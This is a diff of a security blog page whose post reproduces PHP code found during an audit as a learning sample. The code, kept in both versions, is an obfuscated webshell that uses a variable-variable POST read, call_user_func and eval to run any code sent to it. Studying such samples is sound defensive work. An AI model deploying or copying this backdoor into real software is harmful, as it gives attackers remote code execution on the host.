@@ -14,7 +14,7 @@
 <meta property="og:description" content="This php code was obtained during a code audit during my testing. I was very excited to see this, and decided to simulate it for everyone to learn. KnowLedGePoint Count Error_reproting Sizeof Strlen">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-07-31T16:33:02.000Z">
-<meta property="article:modified_time" content="2022-07-30T16:45:11.990Z">
+<meta property="article:modified_time" content="2022-07-30T16:45:46.830Z">
 <meta property="article:author" content="Attck">
 <meta property="article:tag" content="attack,pentest,pentester,redteam">
 <meta name="twitter:card" content="summary">
@@ -110,7 +110,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#KnowLedGePoint"><span class="toc-number">1.</span> <span class="toc-text">KnowLedGePoint</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Call-user-func"><span class="toc-number"></span> <span class="toc-text">Call_user_func</span></a>
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#KnowLedGePoint"><span class="toc-number">1.</span> <span class="toc-text">KnowLedGePoint</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -136,7 +136,7 @@
       
         <time datetime="2022-07-31T16:33:02.000Z" itemprop="datePublished">2022-07-31</time>
         
-        (Updated: <time datetime="2022-07-30T16:45:11.990Z" itemprop="dateModified">2022-07-30</time>)
+        (Updated: <time datetime="2022-07-30T16:45:46.830Z" itemprop="dateModified">2022-07-30</time>)
         
       
     </div>
@@ -159,7 +159,7 @@
 <li>Strlen</li>
 </ul>
 <hr>
-<h2 id="Call-user-func"><a href="#Call-user-func" class="headerlink" title="Call_user_func"></a>Call_user_func</h2><div class="highlight-wrap" data-rel=""><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$exec</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$exec</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aaaa</span> <span class="keyword">extends</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="string">&quot;phpinfo&quot;</span>,<span class="variable">$var</span>[<span class="number">0</span>](<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]));</span><br><span class="line">    <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$var</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$get</span> = <span class="string">&quot;_POST&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$$get</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">aaaa</span>(<span class="variable">$$get</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$exec</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$exec</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aaaa</span> <span class="keyword">extends</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="string">&quot;phpinfo&quot;</span>,<span class="variable">$var</span>[<span class="number">0</span>](<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]));</span><br><span class="line">    <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$var</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$get</span> = <span class="string">&quot;_POST&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$$get</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">aaaa</span>(<span class="variable">$$get</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 
   </div>
@@ -196,7 +196,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#KnowLedGePoint"><span class="toc-number">1.</span> <span class="toc-text">KnowLedGePoint</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Call-user-func"><span class="toc-number"></span> <span class="toc-text">Call_user_func</span></a>
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#KnowLedGePoint"><span class="toc-number">1.</span> <span class="toc-text">KnowLedGePoint</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
